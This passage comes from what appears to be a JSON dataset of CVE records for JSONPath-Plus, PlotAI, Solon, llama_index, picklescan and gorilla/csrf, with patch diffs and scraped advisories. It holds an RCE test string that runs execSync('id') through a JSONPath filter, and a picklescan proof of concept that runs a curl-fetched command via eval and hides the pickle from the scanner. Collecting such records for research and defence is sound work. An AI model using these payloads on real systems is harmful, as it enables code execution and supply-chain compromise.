           ast.computed\n+                ? SafeEval.evalAst(ast.property) // `object[property]`\n+                : ast.property.name // `object.property` property is Identifier\n+        );\n         const obj = SafeEval.evalAst(ast.object, subs);\n         if (obj === undefined || obj === null) {\n             throw TypeError(\n```\n\nFilename: test/test.safe-eval.js:\n```\n@@ -290,6 +290,15 @@\ncheckBuiltInVMAndNodeVM(function (vmType, setBuiltInState) {\n                     jsonpath({json: {x: 1}, path});\n                 }, 'constructor is not defined');\n             });\n+            it(\"10.2.0 RCE\", () => {\n+                assert.throws(() => {\n+                    const exampleObj = {example: true};\n+                    const userControlledPath =\n+                        \"$..[?(p=\\\"console.log(this.process.mainModule.require('child_process').execSync('id').toString())\\\";a=''[['constructor']][['constructor']](p);a())]\";\n+\n+                    jsonpath({json: exampleObj, path: userControlledPath});\n+                }, \"Cannot read properties of  (reading 'constructor')\");\n+            });\n         });\n     });\n });\n```",
                "url": "https://github.com/JSONPath-Plus/JSONPath/commit/30942896d27cb8a806b965a5ca9ef9f686be24ee"
            }
        ],
        "published_date": "2025-02-15T05:00:01.061Z",
        "sec_adv": [],
        "sw_version": "v10.2.0",
        "sw_version_wget": "https://github.com/JSONPath-Plus/JSONPath/archive/refs/tags/v10.2.0.zip"
    },
    "CVE-2025-1497": {
        "cwe": [
            {
                "id": "CWE-77",
                "value": "CWE-77 Improper Neutralization of Special Elements used in a Command ('Command Injection')"
            }
        ],
        "description": "A vulnerability, that could result in Remote Code Execution (RCE), has been found in PlotAI. Lack of validation of LLM-generated output allows attacker to execute arbitrary Python code.\nVendor commented out vulnerable line, further usage of the software requires uncommenting it and thus accepting the risk. The vendor does not plan to release a patch to fix this vulnerability.",
        "languages": [
            "Python"
        ],
        "patch_commits": [
            {
                "content": "comment out exec() method because of securith issues\n\nFilename: plotai/code/executor.py:\n```\n@@ -12,7 +12,12 @@\ndef run(self, code, globals_env=None, locals_env=None):\n                 if not line.startswith(\"```\"):\n                     tmp_code += line + \"\\n\"\n \n-            exec(tmp_code, globals_env, locals_env)\n+            # please be aware of security issue with exec functions\n+            # LLM can execute arbitrary code\n+            # if you are aware of security issues, please uncomment below line\n+\n+            # exec(tmp_code, globals_env, locals_env)\n+            \n         except Exception as e:\n             return str(e)\n         return None\n\\ No newline at end of file\n```",
                "url": "https://github.com/mljar/plotai/commit/bdcfb13484f0b85703a4c1ddfd71cb21840e7fde"
            }
        ],
        "published_date": "2025-03-10T13:56:24.309Z",
        "sec_adv": [],
        "sw_version": "v0.0.6",
        "sw_version_wget": "https://github.com/mljar/plotai/archive/refs/tags/v0.0.6.zip"
    },
    "CVE-2025-1584": {
        "cwe": [
            {
                "id": "CWE-24",
                "value": "Path Traversal: '../filedir'"
            },
            {
                "id": "CWE-23",
                "value": "Relative Path Traversal"
            }
        ],
        "description": "A vulnerability classified as problematic was found in opensolon Solon up to 3.0.8. This vulnerability affects unknown code of the file solon-projects/solon-web/solon-web-staticfiles/src/main/java/org/noear/solon/web/staticfiles/StaticMappings.java. The manipulation leads to path traversal: '../filedir'. The attack can be initiated remotely. The exploit has been disclosed to the public and may be used. Upgrading to version 3.0.9 is able to address this issue. The name of the patch is f46e47fd1f8455b9467d7ead3cdb0509115b2ef1. It is recommended to upgrade the affected component.",
        "languages": [
            "Java"
        ],
        "patch_commits": [
            {
                "content": "\u4fee\u590d solon-web-staticfiles \u7684\u4e00\u4e2a\u6f5c\u5728\u5b89\u5168\u95ee\u9898\n\nFilename: UPDATE_LOG.md:\n```\n@@ -30,7 +30,8 @@\n### v3.0.9\n * \u4fee\u590d solon-docs-openapi2 @Body \u6ce8\u89e3\u8bc6\u522b\u5931\u7075\u7684\u95ee\u9898\n * \u4fee\u590d solon-data nested \u4e8b\u52a1\u7b56\u7565\u5355\u72ec\u56de\u6eda\u5931\u6548\u7684\u95ee\u9898\n-* \u8c03\u6574 solon-flow \u7528 layout \u66ff\u4ee3 nodes \u914d\u7f6e\uff08\u6807\u4e3a\u5f03\u7528\uff09\n+* \u4fee\u590d solon-web-staticfiles \u7684\u4e00\u4e2a\u6f5c\u5728\u5b89\u5168\u95ee\u9898\n+* \u8c03\u6574 solon-flow \u7528 layout \u66ff\u4ee3 nodes \u914d\u7f6e\uff08\u65e7\u7684\u4ecd\u53ef\u7528\uff0c\u6807\u4e3a\u5f03\u7528\uff09\n \n ### v3.0.8\n * \u6dfb\u52a0 solon-web-sse SseRender \u6e32\u67d3\u5668\uff0c\u652f\u6301 \"text/event-stream\" \u7684\u4efb\u610f\u7c7b\u578b\u5904\u7406\n```\n\nFilename: solon-projects/solon-web/solon-web-staticfiles/src/main/java/org/noear/solon/web/staticfiles/StaticMappings.java:\n```\n@@ -68,27 +68,30 @@\npublic static void remove(StaticRepository repository) {\n     public static URL find(String path) throws Exception {\n         URL rst = null;\n \n-        for (StaticLocation m : locationMap.values()) {\n-            if (path.startsWith(m.pathPrefix)) {\n-                if (m.repositoryIncPrefix) {\n-                    //path = /demo/file.htm\n-                    //relativePath = demo/file.htm \uff08\u6ca1\u6709'/'\u5f00\u5934\uff09\n-                    rst = m.repository.find(path.substring(1));\n-                } else {\n-                    //path = /demo/file.htm\n-                    //relativePath = demo/file.htm \uff08\u6ca1\u6709'/'\u5f00\u5934\uff09\n-                    if (m.pathPrefixAsFile) {\n-                        //\u5982\u679c\u662f\u6587\u4ef6\n-                        int idx = m.pathPrefix.lastIndexOf(\"/\");\n-                        rst = m.repository.find(m.pathPrefix.substring(idx + 1));\n+        if (path.contains(\"/../\") == false) {\n+            // '/../' \u4e0d\u5b89\u5168\uff0c\u7981\u6b62\u8fdb\u5165\u9759\u6001\u8d44\u6599\u5e93\n+            for (StaticLocation m : locationMap.values()) {\n+                if (path.startsWith(m.pathPrefix)) {\n+                    if (m.repositoryIncPrefix) {\n+                        //path = /demo/file.htm\n+                        //relativePath = demo/file.htm \uff08\u6ca1\u6709'/'\u5f00\u5934\uff09\n+                        rst = m.repository.find(path.substring(1));\n                     } else {\n-                        //\u5982\u679c\u662f\u8def\u6bb5\n-                        rst = m.repository.find(path.substring(m.pathPrefix.length()));\n+                        //path = /demo/file.htm\n+                        //relativePath = demo/file.htm \uff08\u6ca1\u6709'/'\u5f00\u5934\uff09\n+                        if (m.pathPrefixAsFile) {\n+                            //\u5982\u679c\u662f\u6587\u4ef6\n+                            int idx = m.pathPrefix.lastIndexOf(\"/\");\n+                            rst = m.repository.find(m.pathPrefix.substring(idx + 1));\n+                        } else {\n+                            //\u5982\u679c\u662f\u8def\u6bb5\n+                            rst = m.repository.find(path.substring(m.pathPrefix.length()));\n+                        }\n                     }\n-                }\n \n-                if (rst != null) {\n-                    return rst;\n+                    if (rst != null) {\n+                        return rst;\n+                    }\n                 }\n             }\n         }\n```",
                "url": "https://github.com/opensolon/solon/commit/f46e47fd1f8455b9467d7ead3cdb0509115b2ef1"
            }
        ],
        "published_date": "2025-02-23T12:31:04.886Z",
        "sec_adv": [],
        "sw_version": "v3.0.0",
        "sw_version_wget": "https://github.com/opensolon/solon/archive/refs/tags/v3.0.0.zip"
    },
    "CVE-2025-1752": {
        "cwe": [
            {
                "id": "CWE-400",
                "value": "CWE-400 Uncontrolled Resource Consumption"
            }
        ],
        "description": "A Denial of Service (DoS) vulnerability has been identified in the KnowledgeBaseWebReader class of the run-llama/llama_index project, affecting version ~ latest(v0.12.15). The vulnerability arises due to inappropriate secure coding measures, specifically the lack of proper implementation of the max_depth parameter in the get_article_urls function. This allows an attacker to exhaust Python's recursion limit through repeated function calls, leading to resource consumption and ultimately crashing the Python process.",
        "languages": [
            "Python",
            "Jupyter Notebook"
        ],
        "patch_commits": [
            {
                "content": "fix: respect max_depth in KnowledgeBaseWebReader (#17949)\n\nFilename: llama-index-integrations/readers/llama-index-readers-web/llama_index/readers/web/knowledge_base/base.py:\n```\n@@ -127,7 +127,12 @@\ndef scrape_article(\n         return {\"title\": title, \"subtitle\": subtitle, \"body\": body, \"url\": url}\n \n     def get_article_urls(\n-        self, browser: Any, root_url: str, current_url: str, max_depth: int = 100\n+        self,\n+        browser: Any,\n+        root_url: str,\n+        current_url: str,\n+        max_depth: int = 100,\n+        depth: int = 0,\n     ) -> List[str]:\n         \"\"\"\n         Recursively crawl through the knowledge base to find a list of articles.\n\n@@ -136,11 +141,17 @@\ndef get_article_urls(\n             browser (Any): a Playwright Chromium browser.\n             root_url (str): root URL of the knowledge base.\n             current_url (str): current URL that is being crawled.\n+            max_depth (int): maximum recursion level for the crawler\n+            depth (int): current depth level\n \n         Returns:\n             List[str]: a list of URLs of found articles.\n \n         \"\"\"\n+        if depth >= max_depth:\n+            print(f\"Reached max depth ({max_depth}): {current_url}\")\n+            return []\n+\n         page = browser.new_page(ignore_https_errors=True)\n         page.set_default_timeout(60000)\n         page.goto(current_url, wait_until=\"domcontentloaded\")\n\n@@ -162,7 +173,7 @@\ndef get_article_urls(\n         for link in links:\n             url = root_url + page.evaluate(\"(node) => node.getAttribute('href')\", link)\n             article_urls.extend(\n-                self.get_article_urls(browser, root_url, url, max_depth)\n+                self.get_article_urls(browser, root_url, url, max_depth, depth + 1)\n             )\n \n         page.close()\n```\n\nFilename: llama-index-integrations/readers/llama-index-readers-web/pyproject.toml:\n```\n@@ -46,7 +46,7 @@\nlicense = \"GPL-3.0-or-later\"\n maintainers = [\"HawkClaws\", \"Hironsan\", \"NA\", \"an-bluecat\", \"bborn\", \"jasonwcfan\", \"kravetsmic\", \"pandazki\", \"ruze00\", \"selamanse\", \"thejessezhang\"]\n name = \"llama-index-readers-web\"\n readme = \"README.md\"\n-version = \"0.3.5\"\n+version = \"0.3.6\"\n \n [tool.poetry.dependencies]\n python = \">=3.9,<4.0\"\n```",
                "url": "https://github.com/run-llama/llama_index/commit/3c65db2947271de3bd1927dc66a044da385de4da"
            }
        ],
        "published_date": "2025-05-10T13:21:30.866Z",
        "sec_adv": [
            {
                "content": "Bounties\nPartners\nCommunity\nInfo\nSUBMIT REPORT\nA DoS attack occurred in run-llama/llama_index due to inappropriate secure coding measures in run-llama/llama_index\nValid\nReported on Feb 2nd 2025\nDescription\nA DoS vulnerability has been identified in the KnowledgeBaseWebReader class of the run-llama/llama_index project, and this issue has been reported (see the link below):\nHuntr Report : https://huntr.com/bounties/27883f22-35ff-49df-aaa5-05031c7d6ad8\nHowever, due to the developer's inappropriate mitigation, the DoS vulnerability still persists. As a result, an attacker can perform a DoS attack using the same payload as reported in the link above.\nThe source code of the KnowledgeBaseWebReader class containing the issue\n    def get_article_urls(\n        self, browser: Any, root_url: str, current_url: str, max_depth: int = 100\n    ) -> List[str]:\n        \"\"\"\n        Recursively crawl through the knowledge base to find a list of articles.\n\n        Args:\n            browser (Any): a Playwright Chromium browser.\n            root_url (str): root URL of the knowledge base.\n            current_url (str): current URL that is being crawled.\n\n        Returns:\n            List[str]: a list of URLs of found articles.\n\n        \"\"\"\n        page = browser.new_page(ignore_https_errors=True)\n        page.set_default_timeout(60000)\n        page.goto(current_url, wait_until=\"domcontentloaded\")\n\n        # If this is a leaf node aka article page, return itself\n        if self.article_path in current_url:\n            print(\"Found an article: \", current_url)\n            page.close()\n            return [current_url]\n\n        # Otherwise crawl this page and find all the articles linked from it\n        article_urls = []\n        links = []\n\n        for link_selector in self.link_selectors:\n            ahrefs = page.query_selector_all(link_selector)\n            links.extend(ahrefs)\n\n        for link in links:\n            url = root_url + page.evaluate(\"(node) => node.getAttribute('href')\", link)\n            article_urls.extend(\n                self.get_article_urls(browser, root_url, url, max_depth)\n            )\n\n        page.close()\n\n        return article_urls\nPlease refer to the previously reported Huntr Report link for details on why this code leads to a DoS vulnerability.\nThe developer attempted to prevent the DoS vulnerability by adding max_depth: int = 100, but the secure coding measure was not properly implemented.\nAs the loop progresses, the max_depth value should increment, and execution should terminate when the threshold is reached. However, the current code lacks logic for increasing the threshold or executing the termination process.\ndef get_article_urls(\n    self, browser: Any, root_url: str, current_url: str, max_depth: int, depth: int = 0\n) -> List[str]:\n\n    # Execution terminates when max_depth is reached.\n    if depth >= max_depth:\n        print(f\"Reached max depth ({max_depth}): {current_url}\")\n        return []\n\n    for link in links:\n        href = page.evaluate(\"(node) => node.getAttribute('href')\", link)\n        if href:\n            url = root_url + href if href.startswith(\"/\") else href\n\n            # The depth increases by +1 on each recursive call.\n            article_urls.extend(\n                self.get_article_urls(browser, root_url, url, max_depth, depth + 1)\n            )\n\n    page.close()\n    return article_urls\nPatch Recommendation\nIt is recommended to modify the value of max_depth as the loop progresses, as shown above. When the threshold is reached, the program should either terminate or raise an exception.\nImpact\nThis vulnerability can exhaust Python's recursion limit through repeated function calls, leading to resource consumption and ultimately crashing the Python process.\nOccurrences\nbase.py L129-L170\nWe are processing your report and will contact therun-llama/llama_index team within 24 hours.3 months ago\nA GitHub Issue asking the maintainers to create a SECURITY.md exists3 months ago\nhuntr-helperhas marked this vulnerability as a duplicate of 27883f22-35ff-49df-aaa5-05031c7d6ad83 months ago\nThe disclosure bounty has been dropped\nThe fix bounty has been dropped\nThe researcher's credibility has decreased: -5\nhuntr-helper\ncommented3 months ago\nAdmin\nThis report was closed because it was determined to be a duplicate of a report submitted on 2024-10-28 04:42:27.900000\nA huntr admin reset this report to a pending state.3 months ago\nSirius\ncommented3 months ago\nResearcher\nHello, is the review of the above content in progress?\nMassimiliano Pippi validated this vulnerability3 months ago\nThe researcher is right, fix wasn't effective.\nsiriusbellatrixhas been awarded the disclosure bounty\nThe fix bounty is now up for grabs\nThe researcher's credibility has increased: +7\nCVE-2025-1752assigned to this report.3 months ago\nMassimiliano Pippi\ncommented3 months ago\nMaintainer\nhttps://github.com/run-llama/llama_index/pull/17949\nA run-llama/llama_index maintainerhas acknowledged this report3 months ago\nThe scheduled publication date was automatically extended from 3rd May 2025  to 10th May 2025  due to the maintainers acknowledgement of the report3 months ago\nMassimiliano Pippimarked this as fixedin 0.3.6with commit3c65db3 months ago\nMassimiliano Pippihas been awarded the fix bounty\nbase.py#L129-L170 has been validated\nWe have notified the run-llama/llama_index maintainers about this report in their weekly follow-up11 days ago\nWe have sent a warning to the run-llama/llama_index team to inform them that this report will be published in 48 hours8 days ago\nA  run-llama/llama_index maintainer\ncommented8 days ago\nMaintainer\nFyi, the title of this issue is not accurate. This affects a specific package in our monorepo, not the entire repo or main package\nllama-index-readers-web in llama-index-integrations/readers/llama-index-readers-web\nThis vulnerability has now been published6 days ago\nCVE-2025-1752has now been published6 days ago\nSign in to join this conversation\nCVE\nCVE-2025-1752\n(Published, Under Review)\nVulnerability Type\nCWE-400: Denial of Service\nSeverity\nHigh (7.5)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nNone\nIntegrity\nNone\nAvailability\nHigh\nOpen in visual CVSS calculator\nRegistry\nPypi\nAffected Version\n~ latest(v0.12.15)\nVisibility\nPublic\nStatus\nFixed\nDisclosure Bounty\n$750\nFix Bounty\n$187.5\nFound by\nFixed by\nSupported by Protect AI and leading the way to MLSecOps and greater AI security.\n\u00a9 2024\nPrivacy Policy\nTerms of Service\nCode of Conduct\nCookie Preferences\nContact Us",
                "effective": false,
                "effective_reason": "The advisory provides details about the vulnerability but does not include an explicit proof of concept or reproduction steps.",
                "url": "https://huntr.com/bounties/cd7b9082-7d75-42e4-84f5-dbee23cbc467"
            }
        ],
        "sw_version": "v0.3.5",
        "sw_version_wget": "https://github.com/run-llama/llama_index/archive/refs/tags/v0.3.5.zip"
    },
    "CVE-2025-1944": {
        "cwe": [
            {
                "id": "CWE-345",
                "value": "CWE-345 Insufficient Verification of Data Authenticity"
            }
        ],
        "description": "picklescan before 0.0.23 is vulnerable to a ZIP archive manipulation attack that causes it to crash when attempting to extract and scan PyTorch model archives. By modifying the filename in the ZIP header while keeping the original filename in the directory listing, an attacker can make PickleScan raise a BadZipFile error. However, PyTorch's more forgiving ZIP implementation still allows the model to be loaded, enabling malicious payloads to bypass detection.",
        "languages": [
            "Python"
        ],
        "patch_commits": [
            {
                "content": "Merge commit from fork\n\n* more relaxed ZipFile impl\n\n* lint\n\n---------\n\nCo-authored-by: Matthieu Maitre <mmaitre@live.com>\n\nFilename: src/picklescan/relaxed_zipfile.py:\n```\n@@ -0,0 +1,88 @@\n+import struct\n+import zipfile\n+\n+# More forgiving implementation of zipfile.ZipFile\n+_FH_SIGNATURE = 0\n+_FH_FILENAME_LENGTH = 10\n+_FH_EXTRA_FIELD_LENGTH = 11\n+\n+structFileHeader = \"<4s2B4HL2L2H\"\n+stringFileHeader = b\"PK\\003\\004\"\n+sizeFileHeader = struct.calcsize(structFileHeader)\n+\n+\n+class RelaxedZipFile(zipfile.ZipFile):\n+    def open(self, name, mode=\"r\", pwd=None, *, force_zip64=False):\n+        # near copy of zipfile.ZipFile.open with\n+        \"\"\"Return file-like object for 'name'.\n+\n+        name is a string for the file name within the ZIP file, or a ZipInfo\n+        object.\n+\n+        mode should be 'r' to read a file already in the ZIP file, or 'w' to\n+        write to a file newly added to the archive.\n+\n+        pwd is the password to decrypt files (only used for reading).\n+\n+        When writing, if the file size is not known in advance but may exceed\n+        2 GiB, pass force_zip64 to use the ZIP64 format, which can handle large\n+        files.  If the size is known in advance, it is best to pass a ZipInfo\n+        instance for name, with zinfo.file_size set.\n+        \"\"\"\n+        if mode not in {\"r\", \"w\"}:\n+            raise ValueError('open() requires mode \"r\" or \"w\"')\n+        if pwd and not isinstance(pwd, bytes):\n+            raise TypeError(\"pwd: expected bytes, got %s\" % type(pwd).__name__)\n+        if pwd and (mode == \"w\"):\n+            raise ValueError(\"pwd is only supported for reading files\")\n+        if not self.fp:\n+            raise ValueError(\"Attempt to use ZIP archive that was already closed\")\n+\n+        # Make sure we have an info object\n+        if isinstance(name, zipfile.ZipInfo):\n+            # 'name' is already an info object\n+            zinfo = name\n+        elif mode == \"w\":\n+            zinfo = zipfile.ZipInfo(name)\n+            zinfo.compress_type = self.compression\n+            zinfo._compresslevel = self.compresslevel\n+        else:\n+            # Get info object for name\n+            zinfo = self.getinfo(name)\n+\n+        if mode == \"w\":\n+            return self._open_to_write(zinfo, force_zip64=force_zip64)\n+\n+        if self._writing:\n+            raise ValueError(\n+                \"Can't read from the ZIP file while there \"\n+                \"is an open writing handle on it. \"\n+                \"Close the writing handle before trying to read.\"\n+            )\n+\n+        # Open for reading:\n+        self._fileRefCnt += 1\n+        zef_file = zipfile._SharedFile(\n+            self.fp,\n+            zinfo.header_offset,\n+            self._fpclose,\n+            self._lock,\n+            lambda: self._writing,\n+        )\n+        try:\n+            # Skip the file header:\n+            fheader = zef_file.read(sizeFileHeader)\n+            if len(fheader) != sizeFileHeader:\n+                raise zipfile.BadZipFile(\"Truncated file header\")\n+            fheader = struct.unpack(structFileHeader, fheader)\n+            if fheader[_FH_SIGNATURE] != stringFileHeader:\n+                raise zipfile.BadZipFile(\"Bad magic number for file header\")\n+\n+            zef_file.read(fheader[_FH_FILENAME_LENGTH])\n+            if fheader[_FH_EXTRA_FIELD_LENGTH]:\n+                zef_file.read(fheader[_FH_EXTRA_FIELD_LENGTH])\n+\n+            return zipfile.ZipExtFile(zef_file, mode, zinfo, pwd, True)\n+        except BaseException:\n+            zef_file.close()\n+            raise\n```\n\nFilename: src/picklescan/scanner.py:\n```\n@@ -11,6 +11,7 @@\nfrom typing import IO, List, Optional, Set, Tuple\n import urllib.parse\n import zipfile\n+from .relaxed_zipfile import RelaxedZipFile\n \n from .torch import (\n     get_magic_number,\n\n@@ -375,7 +376,7 @@\ndef get_magic_bytes_from_zipfile(zip: zipfile.ZipFile, num_bytes=8):\n def scan_zip_bytes(data: IO[bytes], file_id) -> ScanResult:\n     result = ScanResult([])\n \n-    with zipfile.ZipFile(data, \"r\") as zip:\n+    with RelaxedZipFile(data, \"r\") as zip:\n         magic_bytes = get_magic_bytes_from_zipfile(zip)\n         file_names = zip.namelist()\n         _log.debug(\"Files in zip archive %s: %s\", file_id, file_names)\n```\n\nFilename: tests/data/malicious1_0x1.zip:\n```\n\n```\n\nFilename: tests/data/malicious1_0x20.zip:\n```\n\n```\n\nFilename: tests/data/malicious1_0x40.zip:\n```\n\n```\n\nFilename: tests/data/malicious1_central_directory.zip:\n```\n\n```\n\nFilename: tests/test_scanner.py:\n```\n@@ -249,6 +249,22 @@\ndef initialize_zip_file(path, file_name, data):\n             zip.writestr(file_name, data)\n \n \n+def initialize_corrupt_zip_file_central_directory(path, file_name, data):\n+    if not os.path.exists(path):\n+        with zipfile.ZipFile(path, \"w\") as zip:\n+            zip.writestr(file_name, data)\n+\n+        with open(path, \"rb\") as f:\n+            data = f.read()\n+\n+        # Replace only the first occurrence of \"data.pkl\" with \"datap.kl\"\n+        modified_data = data.replace(b\"data.pkl\", b\"datap.kl\", 1)\n+\n+        # Write back the modified content\n+        with open(path, \"wb\") as f:\n+            f.write(modified_data)\n+\n+\n def initialize_numpy_files():\n     import numpy as np\n\n@@ -490,6 +506,12 @@\ndef initialize_pickle_files():\n         pickle.dumps(Malicious1(), protocol=4),\n     )\n \n+    initialize_corrupt_zip_file_central_directory(\n+        f\"{_root_path}/data/malicious1_central_directory.zip\",\n+        \"data.pkl\",\n+        pickle.dumps(Malicious1(), protocol=4),\n+    )\n+\n     initialize_zip_file(\n         f\"{_root_path}/data/malicious1_wrong_ext.zip\",\n         \"data.txt\",  # Pickle file with a non-standard extension\n\n@@ -646,7 +668,22 @@\ndef test_scan_file_path():\n     compare_scan_results(\n         scan_file_path(f\"{_root_path}/data/malicious1.zip\"), malicious1\n     )\n-    compare_scan_results(scan_file_path(f\"{_root_path}/data/malicious1.7z\"), malicious1)\n+    compare_scan_results(\n+        scan_file_path(f\"{_root_path}/data/malicious1_central_directory.zip\"),\n+        malicious1,\n+    )\n+    compare_scan_results(\n+        scan_file_path(f\"{_root_path}/data/malicious1_0x1.zip\"), malicious1\n+    )\n+    compare_scan_results(\n+        scan_file_path(f\"{_root_path}/data/malicious1_0x20.zip\"), malicious1\n+    )\n+    compare_scan_results(\n+        scan_file_path(f\"{_root_path}/data/malicious1_0x40.zip\"), malicious1\n+    )\n+    compare_scan_results(\n+        scan_file_path(f\"{_root_path}/data/malicious1.7z\"), malicious1\n+    )\n     compare_scan_results(\n         scan_file_path(f\"{_root_path}/data/malicious1_wrong_ext.zip\"), malicious1\n     )\n\n@@ -835,6 +872,9 @@\ndef test_scan_directory_path():\n             Global(\"functools\", \"partial\", SafetyLevel.Dangerous),\n             Global(\"pip\", \"main\", SafetyLevel.Dangerous),\n             Global(\"builtins\", \"eval\", SafetyLevel.Dangerous),\n+            Global(\"builtins\", \"eval\", SafetyLevel.Dangerous),\n+            Global(\"builtins\", \"eval\", SafetyLevel.Dangerous),\n+            Global(\"builtins\", \"eval\", SafetyLevel.Dangerous),\n         ],\n         scanned_files=38,\n         issues_count=39,\n```",
                "url": "https://github.com/mmaitre314/picklescan/commit/e58e45e0d9e091159c1554f9b04828bbb40b9781"
            }
        ],
        "published_date": "2025-03-10T11:30:32.896Z",
        "sec_adv": [
            {
                "content": "Skip to content\nNavigation Menu\nProduct\nSolutions\nResources\nOpen Source\nEnterprise\nPricing\nSearch or jump to...\nSign in\nSign up\nAppearance settings\nDismiss alert\nmmaitre314\n/\npicklescan\nPublic\nNotifications You must be signed in to change notification settings\nFork 35\nStar 336\nCode\nIssues\n1\nPull requests\nActions\nProjects\nSecurity\n7\nInsights\nAdditional navigation options\nZip Exploit Crashes Picklescan But Not PyTorch\nModerate mmaitre314 published GHSA-7q5r-7gvp-wc82 on Mar 8Mar 9, 2025\nPackage\npip picklescan\n(\npip\n)\nAffected versions\n< 0.0.23\nPatched versions\n0.0.23\nDescription\nCVE-2025-1944\nSummary\nPickleScan is vulnerable to a ZIP archive manipulation attack that causes it to crash when attempting to extract and scan PyTorch model archives. By modifying the filename in the ZIP header while keeping the original filename in the directory listing, an attacker can make PickleScan raise a BadZipFile error. However, PyTorch's more forgiving ZIP implementation still allows the model to be loaded, enabling malicious payloads to bypass detection.\nDetails\nPython's built-in zipfile module performs strict integrity checks when extracting ZIP files. If a filename stored in the ZIP header does not match the filename in the directory listing, zipfile.ZipFile.open() raises a BadZipFile error. PickleScan relies on zipfile to extract and inspect the contents of PyTorch model archives, making it susceptible to this manipulation.\nPyTorch, on the other hand, has a more tolerant ZIP handling mechanism that ignores these discrepancies, allowing the model to load even when PickleScan fails. An attacker can exploit this behavior to embed a malicious pickle file inside a model archive, which PyTorch will load, while preventing PickleScan from scanning the archive.\nPoC\nimport os\nimport torch\n\nclass RemoteCodeExecution:\n    def __reduce__(self):\n        return os.system, (f\"eval \\\"$(curl -s http://localhost:8080)\\\"\",)\n\n\nmodel = RemoteCodeExecution()\nfile = \"does_not_scan_but_opens_in_torch.pth\"\ntorch.save(model, file)\n\n# modify the header to cause the zip file to raise execution in picklescan\nwith open(file, \"rb\") as f:\n    data = f.read()\n\n# Replace only the first occurrence of \"data.pkl\" with \"datap.kl\"\nmodified_data = data.replace(b\"data.pkl\", b\"datap.kl\", 1)\n\n# Write back the modified content\nwith open(file, \"wb\") as f:\n    f.write(modified_data)\n\n# Load the infected model\ntorch.load(file)  \nImpact\nSeverity: High\nWho is impacted? Any organization or individual using PickleScan to detect malicious pickle files in PyTorch models.\nWhat is the impact? Attackers can embed malicious payloads inside PyTorch model archives while preventing PickleScan from scanning them.\nPotential Exploits: This technique can be used in supply chain attacks to distribute backdoored models via platforms like Hugging Face.\nRecommendations\nUse a More Tolerant ZIP Parser: PickleScan should handle minor ZIP header inconsistencies more gracefully instead of failing outright.\nDetect Malformed ZIPs: Instead of crashing, PickleScan should log warnings and attempt to extract valid files.\nSeverity\nModerate\n5.3\n/ 10\nCVSS v4 base metrics\nExploitability Metrics\nAttack Vector\nNetwork\nAttack Complexity\nLow\nAttack Requirements\nNone\nPrivileges Required\nNone\nUser interaction\nPassive\nVulnerable System Impact Metrics\nConfidentiality\nNone\nIntegrity\nLow\nAvailability\nNone\nSubsequent System Impact Metrics\nConfidentiality\nNone\nIntegrity\nNone\nAvailability\nNone\nLearn more about base metrics\nCVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N\nCVE ID\nNo known CVE\nWeaknesses\nNo CWEs\nCredits\nmadgetr\nReporter\naxsonatype\nCoordinator\nFooter\n\u00a9 2025 GitHub, Inc.\nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\nManage cookies\nDo not share my personal information",
                "effective": true,
                "effective_reason": "The advisory includes a code snippet demonstrating how to modify the ZIP file to exploit the vulnerability in the library.",
                "url": "https://github.com/mmaitre314/picklescan/security/advisories/GHSA-7q5r-7gvp-wc82"
            }
        ],
        "sw_version": "v0.0.22",
        "sw_version_wget": "https://github.com/mmaitre314/picklescan/archive/refs/tags/v0.0.22.zip"
    },
    "CVE-2025-24358": {
        "cwe": [
            {
                "id": "CWE-352",
                "value": "CWE-352: Cross-Site Request Forgery (CSRF)"
            }
        ],
        "description": "gorilla/csrf provides Cross Site Request Forgery (CSRF) prevention middleware for Go web applications & services. Prior to 1.7.2, gorilla/csrf does not validate the Origin header against an allowlist. Its executes its validation of the Referer header for cross-origin requests only when it believes the request is being served over TLS. It determines this by inspecting the r.URL.Scheme value. However, this value is never populated for \"server\" requests per the Go spec, and so this check does not run in practice. This vulnerability allows an attacker who has gained XSS on a subdomain or top level domain to perform authenticated form submissions against gorilla/csrf protected targets that share the same top level domain. This vulnerability is fixed in 1.7.2.",
        "languages": [
            "Go"
        ],
        "patch_commits": [
            {
                "content": "Merge commit from fork\n\n* csrf: use context to determine TLS state\n\nr.URL.Scheme is never populated for \"server\" requests, and so the\nreferer check never runs.\n\nInstead we now ask the caller application to signal this explicitly via\nrequest conext, and then enforce the check accordingly.\n\nSeparately, browsers do not always send the full URL as a Referer,\nespecially in the same-origin context meaning we cannot compare its host\nagainst our trusted origin list. If the referer does not contain a host\nwe populate r.URL.Host with r.Host which is expected to be sent by all\nclients as the first header of their request.\n\nAdd tests against the Origin header before attempting to enforce\nsame-origin restrictions using the Referer header.\n\nMatching the Django CSRF behavior: if the Origin is present in either\nthe cleartext or TLS case we will evaluate it.\n\nIFF we are in TLS and we have no Origin we will evaluate the Referer\nagainst the allowlist. In doing so we take care to permit \"path only\"\nReferers that are sent in same-origin context.\n\n* add csrf.TLSRequest helper API to set request TLS context\n\nAdd a csrf.TLSRequest public API method that sets the appropriate TLS\ncontext key and signals to the midldeware the need to run the\nadditiontal Referer checks.\n\n* Enable Referer-based origin checks by default\n\nReverse the default position and presume that that the server is using\nTLS either directly or via an upstream proxy and require the user to\nexplicitly disable referer-based checks.\n\nThis safe default means that users that upgrade the library without\nmaking any other code changes will benefit from the Referer checks that\nthey thought were active already. Without this change we risk that some\ncodebases will mistakenly remain vulnerable even while using a patched\nversion of the library.\n\nFilename: csrf.go:\n```\n@@ -1,10 +1,12 @@\npackage csrf\n \n import (\n+\t\"context\"\n \t\"errors\"\n \t\"fmt\"\n \t\"net/http\"\n \t\"net/url\"\n+\t\"slices\"\n \n \t\"github.com/gorilla/securecookie\"\n )\n\n@@ -22,6 +24,14 @@\nconst (\n \terrorPrefix  string = \"gorilla/csrf: \"\n )\n \n+type contextKey string\n+\n+// PlaintextHTTPContextKey is the context key used to store whether the request\n+// is being served via plaintext HTTP. This is used to signal to the middleware\n+// that strict Referer checking should not be enforced as is done for HTTPS by\n+// default.\n+const PlaintextHTTPContextKey contextKey = \"plaintext\"\n+\n var (\n \t// The name value used in form fields.\n \tfieldName = tokenKey\n\n@@ -41,6 +51,9 @@\nvar (\n \t// ErrNoReferer is returned when a HTTPS request provides an empty Referer\n \t// header.\n \tErrNoReferer = errors.New(\"referer not supplied\")\n+\t// 